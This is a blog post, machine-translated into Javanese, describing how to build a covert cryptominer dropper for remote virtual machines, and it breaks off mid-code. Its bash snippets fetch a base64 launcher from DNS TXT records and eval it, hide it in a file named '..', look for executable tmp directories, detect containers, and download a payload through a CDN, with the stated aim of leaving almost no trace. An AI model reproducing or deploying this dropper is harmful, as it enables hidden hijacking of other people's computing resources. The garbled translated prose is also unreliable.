both}@-webkit-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><link href=https://www.unto.re/jw/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Babad saka dropper cryptonote</title><script type=application/ld+json>{"url":"/jw/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/jw/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-11-06T11:17:24.153","inLanguage":"jw","name":"","mainEntityOfPage":{"@id":"/jw/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/jw/></a><div class=author__wrap><ul><li class=author__avatar><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/jw/posts/><i class="fas fa-pen menu-icons"></i> kiriman</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/jw/media/><i class="fas fa-tv menu-icons"></i> media</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/jw/posts/><i class="fas fa-pen menu-icons"></i> kiriman</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/jw/media/><i class="fas fa-tv menu-icons"></i> media</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div></nav></div></div></div><div><h1 id=title><a href=/jw/posts/chronichles_of_a_cryptonote_dropper> Babad saka dropper cryptonote</a></h1><blockquote id=page-description style=font-style:italic>... Sampeyan gelem tekan pira ... dhuwit?</blockquote></div><div class=franklin-content><p>Nganggep sampeyan pengin mine<a href=https://en.wikipedia.org/wiki/Cryptocurrency> cryptocurrency</a> ing remot<em> virtual</em> piranti keras Sampeyan kudu golek barang kanggo mine. Server adoh tegese, ora<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> utawa GPU bukti algoritma kerja, mung umume<a href=\posts/a-few-notes-on-proof-of-work> Koin sing ramah CPU</a>.<h2 id=the_software><a class=header-anchor href=#the_software> Piranti lunak kasebut</a></h2><p>Telusuri banjur temokake a<a href=https://github.com/xmrig/xmrig> panambang</a> , nanging pancen ora apik, sampeyan pengin sing sampeyan bisa ngontrol luwih saka adoh, dadi sampeyan bisa nemokake<a href=https://github.com/Bendr0id/xmrigCC> panambang liyane</a> . Sampeyan uga pengin a<a href=https://github.com/Bendr0id/xmrigcc-proxy> proksi</a> , amarga akeh sambungan sing ora suwe, sampeyan ora gelem<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> dos</a> kolam pertambangan sampeyan. Uga a<a href=https://github.com/search?q=tunnel> trowongan</a> bakal apik.<h2 id=the_design><a class=header-anchor href=#the_design> Desaine</a></h2><p>Sawetara botnet nggunakake data blockchains kanggo nggoleki perintah,<a href=https://twitter.com/sarahjamielewis> piyantun</a> uga katon duwe<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> taruhan ilang</a> iki ora kedadeyan maneh ... nanging kita ora canggih, kita bakal entuk sawetara cathetan DNS sing nyimpen skrip sing narik muatan sing ekstrak dhewe ing direktori temp sing ditindakake lan godhong<em> meh</em> ora ana tilase persiyapane. Iki minangka bagan aliran cilik sing nggambarake strukture<h2 id=launcher><a class=header-anchor href=#launcher> Peluncur</a></h2><p>Titik skrip wiwitan yaiku supaya bisa diakses lan gampang diupdate supaya ora bisa nyoba wektu. Nganyari<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> cathetan gampang, lan DNS minangka perkara pungkasan sing mati ing jaringan.. Amarga alamat IP angel dielingi ... mula bisa uga biasane kasedhiya. Sampeyan ndeleng nalika kita lagi<em> njupuk skrip penyebaran</em>kita sejatine wis mbukak sawetara logika, iki skrip peluncur, butuh kemampuan kanggo nindakake pitakon DNS kanggo nggoleki cathetan, DNS bisa uga ana ing endi wae nanging<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> nggali</a> ora.<p>Ing kene ana sawetara conundrum, yen kudu ndownload alat liyane<em> kanggo ndownload skrip liyane kanggo ndownload muatan</em> kita mung kudu ndownload muatan! Kanggo pertahanan ... nindakake nari scripty iki nambah keruwetan, ngidini supaya ora mung implementasi peluncur (bisa dipertahankan, ya), ora dibutuhake kaping pirang-pirang kaping .. mula kita uga kudu<a href=https://en.wikipedia.org/wiki/Standalone_program> gegandhengan statis</a> dig eksekusi kanggo nindakake pitakon dns, dijupuk kanthi hosting dhewe, utawa hosting cloud (ya ana fallbacks, kayata 3 utawa 4, amarga layanan cloud duwe bandwidth gratis sing paling sithik, lan uga mbutuhake cookie utawa token akses ... iku skrip banget ora grapyak, pancen sengaja, mesthi).<p>Apa sing ana ing cathetan dns? Kita nggunakake<a href=https://en.wikipedia.org/wiki/TXT_record> TXT</a> cathetan, ing domain khusus (fallback uga ing kene). Napa TXT? kedadeyan kasebut minangka sing bisa nyimpen data paling gedhe..biasane amarga jenis<a href=https://www.ietf.org/rfc/rfc6763.txt> disaranake</a> gumantung ing<em> barang-barang</em> . Kita nggunakake khusus<a href=https://www.cloudflare.com/> cloudflare</a> kanggo fiddling DNS amarga gratis, lan mung siji-sijine pemain ing kutha iki (<em> uga ora bener nanging alternatif alternatif liyane sing wicaksana</em> ). Sampeyan bisa nyimpen macem-macem data ing<em> padha</em> ngrekam ... iki wiwit bingung lan scramble kanggo sawetara spesifikasi ... (tangent) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> biyen</a> ngidini<em> dirantai</em>Data TXT total ~ 9k byte, dokumen saiki nyatakake ~ 2k byte, sadurunge pangowahan sing digunakake ~ 6k, dakkira, lan ngladeni skrip kanthi ora dikompres, sawise iku aku kudu nyuda skrip lan ngompres sadurunge tangan (sejatine aku nyoba nggunakake a<a href=https://freedns.afraid.org/> bebasan</a> panyedhiya, aku dilarang sajrone sedina, ngira dheweke duwe kabijakan rekam TXT tanpa lemak sing ketat), nanging kompresi gzip katon ora grapyak lan isih nyebabake masalah, mula aku kudu ngatur skrip tanpa kompresi ( tangen pungkasan).<p>Kepiye cara nyimpen? Cathetan TXT mung ndhukung senar alfanumerik, ora<a href=https://en.wikipedia.org/wiki/Null_character> NUL</a> , mula kita kudu mbungkus enkoding non nol,<a href=https://en.wikipedia.org/wiki/Base64> pangkalan64</a> nglegani kendala iki, lan amarga kita nyimpen<em> dirantai</em> Cathetan TXT, kita kudu nyuda output, amarga nggunakake barang-barang cangkang, iki rampung liwat<code>-w</code> gendera, ing kotak sibuk, gendera kasebut biasane ora ana (utawa milih) ing versi lawas sing ngganggu, alternatif yaiku nggunakake enkoder sing dibungkus opensl,<code>openssl enc -base64</code>.<p>Saiki kita ngerti cara nyimpen skrip penyebaran, kita uga bakal nyimpen<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf kli</a> utawa kanthi manual. Kepiye cara narik? Kita ujar manawa kita butuh bindutil utawa duweke dhewe<code>dig</code> ... sawise milih titik pungkasan sing ditawakake, kita pengin ndownload, biasane sing kasedhiya<a href=https://www.gnu.org/software/wget/> wget</a> utawa<a href=https://curl.se/> nggulung</a> , wget ditemokake sing wis diinstal luwih asring, nanging busybox mung menehi dhukungan tls karo perpustakaan dinamis, dadi sampeyan kudu priksa manawa titik pungkasan kasedhiya http utawa sarana sampeyan digunakake<code>wget</code> saka gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>Iku tegese nyoba<code>-t2</code> kaping ngenteni<code>-T10</code> detik dadi<code>-q</code> maca sepi saka<code>-i-</code> stdin (<code>$digurl</code> ) lan nulis menyang<code>-O-</code> stdout (<code>$filename</code>). Prentah iki ora mbukak apa sing didownload sadurunge. Kita bakal ngati-ati banget karo perintah cangkang liyane amarga padha, utawa tetep nganggo cangkang (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> bash</a> ) built-in yen bisa. Priksa uga babagan ngendi sampeyan ndownload eksekusi, sampeyan pengin njamin supaya bisa dieksekusi, amarga sawetara titik sing dipasang, utamane ing kontainer lan<code>tmp</code> dalan yaiku<code>noexec</code> . Saiki duwe alat pitakon dns, kita njupuk cathetan<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Gendera jelas dhewe ing kene,<code>+short</code> tegese kita mung kepincut karo data kasebut, mula ora prelu ngrampungake output. Penting kanggo nemtokake server DNS, kayata google (<code>8.8.8.8</code> ) utawa cloudflare (<code>1.1.1.1</code> ) amarga akeh lingkungan sing pangalihan utawa proksi dns query menyang server dns dhewe kanthi gawan. Sawise njupuk skrip potongan, kita bakal menehi hasil kuotasi lan papan putih supaya siyap kanggo dekoding<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>Kepiye yen saiki kita<em> isih</em> ora duwe launcher kita? DNS semrawut, kita pengin fallback, ayo nyiyapake subdomain kanggo njupuk skrip launcher langsung. Sadurunge ngevaluasi skrip, kita pengin ngatur, kanthi sawetara variabel, maneh nggunakake rekaman TXT kanggo nyimpen dhaptar variabel NAMA = NILAI lan diurai. Uga ana fallback kanggo variabel, cloudflare nawakake pangalihan adhedhasar URL, pangalihan kasebut diwenehake<em> sadurunge</em> tujuane, dadi ora butuh endpoint, mung pengin ngatur aturan pangalihan adhedhasar regex menyang endpoint fiktif, sing dadi minat yaiku parameter url<code>?NAME=VALUE&NAME2=VALUE2...</code>, supaya kita bisa nggawe parametrik peluncur kanthi mung ngganti url pangalihan, kanthi ati-ati karo petik lan uwal kode<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>Wget<code>-S</code> nyithak url pangalihan sing kepincut kanggo parsing. Duwe paramÃ¨ter lan skrip, kita evaluasi variabel sing ditulis liwat file<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>File iki bakal diwenehi skrip penyebaran. PÃ©rangan pungkasan skrip wiwitan yaiku aktual<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> trampolin</a> , evaluasi skrip ing proses shell saiki, utawa bisa uga dikelola dening tmux yen bisa.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>Skrip peluncur dibuwang menyang file sing dijenengi ".." iki katon mbingungake amarga bisa dianggep salah<em> wong tuwa</em> direktori Lan ora kalebu perintah sesi, amarga bakal tetep ana ing prentah proses, tinimbang luwih dhisik miwiti sesi tmux lan ngirim komando sumber liwat antarmuka terminal tmux. Gegayutan karo iki, kadang diarani eksekusi karo<code>./</code> njaga supaya pesen kasebut dadi printah, mula luwih becik nambahake<code>$PWD</code> menyang dalan ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> Payload ing</a></h2><p>Skrip penyebaran kita diwiwiti kanthi sumber<code>env.sh</code> file, lan nyimpen utawa ngonfigurasi vars minangka<code>STARTING_*</code> vars kaya<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Iki ngidini kita mateni lan miwiti maneh conto sing mlaku nalika ngreset lingkungan. Monggo ngalih menyang direktori tmp kanthi kapabilitas exec<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Priksa manawa ing a<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> wadhah</a> uga gampang, kita bisa mriksa sistem file kanggo diwenehi petunjuk<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Saiki wayahe ndownload muatan, kita milih dhukungan kanggo wget lan curl, kita wis ngerti cara nggunakake wget kanthi panji sing ati-ati, amarga curl rada beda. Kita kudu nggawe file config, lan nolak<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>Langkah pungkasan mung kanggo ngekstrak muatan<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Perlu dielingake panggunaan [CDN] kanggo ngladeni muatan kasebut. Ing kene maneh cloudflare kanggo nylametake nyimpen kita saka pangeluaran bandwidth. Cukup kanthi ganti jeneng muatan sing dikompres karo<em> ekstensi file</em> didhukung dening cloudflare ... dadi cache. Cloudflare ora mriksa header apa sing dilayani, bisa uga amarga tumindak kasebut ing skala kasebut pancen ora praktis.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Petualangan mudhun Bashland</a></h2><p>Bash dipilih kanthi asumsi portabel, ora katon pas lan luwih umum ing endi wae dibandhingake karo basa skrip liyane kayata perl, ruby â€‹â€‹utawa python. Sejatine, binar mandiri sing ditulis ing golang utawa lua mesthi luwih gampang, kanthi ora ana kewan omo, lan luwih gampang dikelola, umume bash minangka pilihan paling ala, ing pertahananku, nalika aku kegores kanthi gatel. , wis kasep kanggo nulis ulang, lan uga saya bosen.<p>Uga ana pilihan kanggo nggunakake busybox kanthi panji wektu kompile kanggo nggunakake kabeh builtin (kaya grep lan sed), nanging nggunakake builtin kanthi cara iki ora ngidini ngasilake (garpu) lan nyedhiyakake daemon menyang buntu.<p>Aku bakal nerangake sawetara fungsi bash ing kene, kanthi dhaptar lengkap sing kasedhiya<a href=\assets/posts/bash_functions.txt> ing kene</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Gunakake ing<code>RANDOM</code> variabel kanggo entuk nomer antarane 97-122 sing cocog karo kode karakter, printf kudu dibangun, kita ora pengin garpu ing daur ulang.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Pipa pengaruh kanggo nggawe deskriptif file anonim, iki ora tumindak persis kaya deskriptif file nanging cukup kanggo<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Turu tanpa forking, kanthi nyalahake fungsi wektu entek saka read builtin, nggunakake deskriptor file khusus lan kita kudu mesthekake yen kasedhiya supaya ora mandheg.<p>Ana fungsi kaya<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> digunakake kanggo ngawasi panggunaan sistem, kabeh nggunakake linux<code>/proc</code> file tanpa alat kaya<code>ps</code> , mula ora ana garpu, kabeh bash murni.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Coprocesses kasedhiya wiwit bash<code>v4</code> , dheweke kaya proyek kajaba duwe jeneng lan deskriptor file dhewe.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
